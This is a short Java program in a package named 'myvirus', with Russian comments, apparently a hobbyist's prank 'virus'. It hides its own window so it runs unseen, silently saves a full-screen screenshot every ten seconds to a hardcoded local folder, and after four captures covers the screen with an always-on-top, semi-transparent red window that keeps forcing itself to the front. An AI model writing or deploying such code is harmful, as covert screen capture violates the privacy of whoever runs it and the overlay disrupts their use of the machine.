package myvirus;

import java.awt.AWTException;
import java.awt.Color;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import javax.imageio.ImageIO;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.Timer;

public class StartVirus {

	public static void main(String[] args) {
		// создаём объект окна
		new MyFrame();
	}	
}

class MyFrame extends JFrame
{
	// робот
	private Robot rob;
	
	// таймеры
	private Timer tm, tm1;
	
	// количество скриншотов
	int kol, time = 0;
	
	// конструтор класса
	public MyFrame()
	{
		try {
			// создаём объект робота
			rob = new Robot();
		} catch (AWTException e) {
			e.printStackTrace();
		}
		
		// создаём таймер с задержкой в 10 секунд
		tm = new Timer(10000, new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				// метод для снятия скриншота
				saveScreen();
		}});
		// запускаем таймер
		tm.start();
		
		// НЕ завершать работу приложения при закрытии окна
		setDefaultCloseOperation(JFrame.HIDE_ON_CLOSE);
		
		// делаем окно видимым
		setVisible(true);
		
		// сразу его прячем
		setVisible(false);
	}
	
	// метод для снятия скриншота и сохранения его в файл
	/**
	 * 
	 */
	private void saveScreen()
	{
		// считаем количество скриншотов
		kol++;
		
		// определить текущее разрешение экрана
		Dimension dm = Toolkit.getDefaultToolkit().getScreenSize();
		
		int w = dm.width;
		int h = dm.height;
		
		// снимает скриншот с экрана с помощью класса робот
		BufferedImage img = rob.createScreenCapture(new Rectangle(0,0,w,h));
		
		// сохраняем картинку в пнг файле
		// "С:\\img" + kol + ".png" 
		try {
			ImageIO.write(img, "PNG", new File("D:\\Files\\MakShish\\Desktop\\screen\\img" + kol + ".png"));
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		// если скриншотов станет больше 3, то
		if (kol>3)
		{
			// останавливаем таймер
			tm.stop();
			
			// создадим окно
			JFrame wnd = new JFrame();
			
			// отключаем возможность изменения размеров окна
			wnd.setResizable(false);
			
			// установим размер окна во весь экран
			wnd.setBounds(0,0,w,h);
			
			// установим цвет фона красный
			JPanel pan = new JPanel();
			
			pan.setBackground(Color.RED);
			
			wnd.add(pan);
			
			// убираем рамку окна
			wnd.setUndecorated(true);
			
			// добавим прозрачность окну
			wnd.setOpacity(0.5f);
			
			// размещаем окно поверх других
			wnd.setAlwaysOnTop(true);
			
			// выводим окно
			wnd.setVisible(true);
			
			// создаём таймер с задержкой в 10 секунд
			tm1 = new Timer(10, new ActionListener() {
				public void actionPerformed(ActionEvent e) {
					// вывод окна на передний план
					wnd.toFront();
					time++;
					// изменить время можно здесь
					if (time > 1000)
					{
						tm1.stop();
						wnd.setVisible(false);
					}
			}});
			// запускаем таймер
			tm1.start();
		}
	}
}